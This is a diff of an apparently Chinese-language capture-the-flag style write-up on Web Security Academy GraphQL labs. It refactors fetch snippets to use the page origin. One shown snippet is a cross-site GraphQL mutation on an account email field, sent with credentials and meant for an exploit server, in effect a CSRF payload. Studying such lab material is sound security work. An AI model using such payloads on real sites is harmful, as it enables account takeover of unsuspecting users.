@@ -298,19 +298,16 @@ query getBlogSummaries {
         id
     }
 }`;
-fetch(
-  "https://0adf007d042cd25e83bdb91b000100f7.web-security-academy.net/graphql/v1",
-  {
-    headers: {
-      "content-type": "application/json",
-    },
-    body: JSON.stringify({
-      query: query,
-      operationName: "getBlogSummaries",
-    }),
-    method: "POST",
+fetch(`${location.origin}/graphql/v1`, {
+  headers: {
+    "content-type": "application/json",
   },
-);
+  body: JSON.stringify({
+    query: query,
+    operationName: "getBlogSummaries",
+  }),
+  method: "POST",
+});
 ```
 
 回傳
@@ -900,7 +897,6 @@ fetch(`${location.origin}/graphql/v1`, {
     query: query,
   }),
   method: "POST",
-  mode: "cors",
   credentials: "include",
 });
 ```
@@ -936,18 +932,14 @@ mutation {
         email
     }
 }`;
-fetch(
-  "https://0aea00d403936815809249e50054008d.web-security-academy.net/graphql/v1",
-  {
-    headers: {
-      "content-type": "application/x-www-form-urlencoded",
-    },
-    body: `query=${encodeURIComponent(query)}`,
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
+fetch(`${location.origin}/graphql/v1`, {
+  headers: {
+    "content-type": "application/x-www-form-urlencoded",
   },
-);
+  body: `query=${encodeURIComponent(query)}`,
+  method: "POST",
+  credentials: "include",
+});
 ```
 
 在 exploit-server 構造
